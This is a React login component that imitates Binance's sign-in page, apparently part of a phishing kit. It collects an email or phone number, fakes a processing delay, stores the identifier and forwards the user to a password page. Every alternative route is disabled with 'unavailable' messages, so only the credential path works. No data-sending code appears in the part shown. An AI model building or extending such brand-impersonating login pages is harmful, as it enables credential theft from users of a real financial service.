import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '@/store/AppContext';
import { LoadingBars } from '@/components/ui/custom/LoadingBars';

export default function Login() {
  const navigate = useNavigate();
  const { showToast } = useApp();
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  function detectInputType(input: string): 'email' | 'phone' | 'invalid' | 'empty' {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^[0-9]{10,}$/;
    
    if (emailRegex.test(input)) return 'email';
    if (phoneRegex.test(input.replace(/\D/g, ''))) return 'phone';
    if (input.length > 0) return 'invalid';
    return 'empty';
  }

  async function handleContinue() {
    const type = detectInputType(email);
    
    if (type === 'invalid' || type === 'empty') {
      showToast('Please enter a valid email or phone number', 'error');
      return;
    }
    
    setIsLoading(true);
    
    // Simulate processing
    await new Promise(resolve => setTimeout(resolve, 2500));
    
    // Store login identifier for password page
    sessionStorage.setItem('loginIdentifier', email);
    
    setIsLoading(false);
    navigate('/password');
  }

  function handleSocialClick(provider: string) {
    showToast(`${provider} login is currently unavailable`, 'info');
  }

  function handleKeyPress(e: React.KeyboardEvent) {
    if (e.key === 'Enter') {
      handleContinue();
    }
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#1D252B]">
      <div className="flex-1 flex flex-col px-6 pt-5 pb-1 max-w-[400px] mx-auto w-full">
        {/* Logo */}
        <div className="flex items-center gap-2 mb-7 self-start">
          <img src="/source/logo.png" alt="Binance" className="h-8 w-auto" />
        </div>

        <h1 className="text-[30px] font-semibold mb-7 text-white">Log in</h1>

        <div className="mb-4">
          <label className="block text-sm text-[#848E9C] mb-2">Email/Phone number</label>
          <input
            type="text"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            onKeyPress={handleKeyPress}
            placeholder="Email/Phone (without country code)"
            className="binance-input px-4 py-3.5"
          />
        </div>

        <button
          onClick={handleContinue}
          disabled={isLoading}
          className="binance-btn mt-2 h-12 md:h-11 lg:h-11 text-[15px] md:text-base"
        >
          {isLoading ? (
            <LoadingBars color="#1E2329" size="sm" />
          ) : (
            'Continue'
          )}
        </button>

        <div className="flex items-center my-6 text-[#848E9C] text-sm">
          <div className="flex-1 h-px bg-[#474D57]" />
          <span className="px-4">or</span>
          <div className="flex-1 h-px bg-[#474D57]" />
        </div>

        {/* Social buttons */}
        <button
          onClick={() => handleSocialClick('Passkey')}
          className="social-btn h-12 md:h-11 lg:h-11 text-[15px] md:text-base mb-3"
        >
          <svg viewBox="0 0 24 24" className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="1.8">
            <circle cx="9" cy="7" r="4"/>
            <path d="M2 20c0-4 3-7 7-7"/>
            <circle cx="18" cy="16" r="2"/>
            <path d="M20 16h2m-1-1v2"/>
          </svg>
          Continue with Passkey
        </button>

        <button
          onClick={() => handleSocialClick('Google')}
          className="social-btn h-12 md:h-11 lg:h-11 text-[15px] md:text-base mb-3"
        >
          <svg viewBox="0 0 24 24" className="w-5 h-5">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
          </svg>
          Continue with Google
        </button>

        <button
          onClick={() => handleSocialClick('Apple')}
          className="social-btn h-12 md:h-11 lg:h-11 text-[15px] md:text-base mb-3"
        >
          <svg viewBox="0 0 170 170" className="w-5 h-5" fill="currentColor">
            <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.197-2.12-9.973-3.17-14.34-3.17-4.58 0-9.492 1.05-14.746 3.17-5.262 2.13-9.501 3.24-12.742 3.35-4.929.21-9.842-1.96-14.746-6.52-3.13-2.73-7.045-7.41-11.735-14.04-5.032-7.08-9.169-15.29-12.41-24.65-3.471-10.11-5.211-19.9-5.211-29.378 0-10.857 2.346-20.221 7.045-28.1 3.693-6.303 8.606-11.275 14.755-14.925s12.793-5.51 19.948-5.629c3.915 0 9.049 1.211 15.429 3.591 6.362 2.388 10.447 3.599 12.238 3.599 1.339 0 5.877-1.416 13.57-4.239 7.275-2.618 13.415-3.702 18.445-3.275 13.63 1.1 23.87 6.473 30.68 16.153-12.19 7.386-18.22 17.731-18.1 31.002.11 10.337 3.86 18.939 11.23 25.769 3.34 3.17 7.07 5.62 11.22 7.36-.9 2.61-1.85 5.11-2.86 7.51zM119.11 7.24c0 8.102-2.96 15.667-8.86 22.669-7.12 8.324-15.732 13.134-25.071 12.375-.12-.972-.19-1.995-.19-3.07 0-7.778 3.387-16.102 9.403-22.908 3.002-3.446 6.82-6.311 11.45-8.597 4.62-2.252 8.99-3.497 13.1-3.71.12 1.083.17 2.166.17 3.241z"/>
          </svg>
          Continue with Apple
        </button>

        <button
          onClick={() => handleSocialClick('Telegram')}
          className="social-btn h-12 md:h-11 lg:h-11 text-[15px] md:text-base mb-3"
        >
          <svg viewBox="0 0 24 24" className="w-5 h-5" fill="#2AABEE">
            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.226-.461-1.901-.903-1.056-.692-1.653-1.123-2.678-1.799-1.185-.781-.417-1.21.258-1.911.177-.184 3.247-2.977 3.307-3.23.007-.032.015-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.139-5.062 3.345-.479.329-.913.489-1.302.481-.428-.009-1.252-.242-1.865-.442-.751-.244-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.831-2.529 6.998-3.015 3.333-1.386 4.025-1.627 4.477-1.635.099-.002.321.023.465.141.121.099.154.232.17.325.015.093.034.305.019.471z"/>
          </svg>
          Continue with Telegram
        </button>

        <div className="mt-12 mb-14 flex flex-col gap-4">
          <button onClick={() => handleSocialClick('Register')} className="footer-link text-left">
            Create a Binance Account
          </button>
          <button onClick={() => handleSocialClick('Help')} className="footer-link text-left">
            Need help?
          </button>
        </div>
      </div>

      {/* Footer */}
      <div className="py-6 px-4 flex justify-center items-center gap-8 text-sm text-[#848E9C]">
        <button className="flex items-center gap-2 hover:text-[#EAECEF] transition-colors">
          <svg viewBox="0 0 24 24" className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2">
            <circle cx="12" cy="12" r="10"/>
            <path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
          </svg>
          English
        </button>
        <button className="hover:text-[#EAECEF] transition-colors">Cookies</button>
        <button className="hover:text-[#EAECEF] transition-colors">Privacy</button>
      </div>
    </div>
  );
}
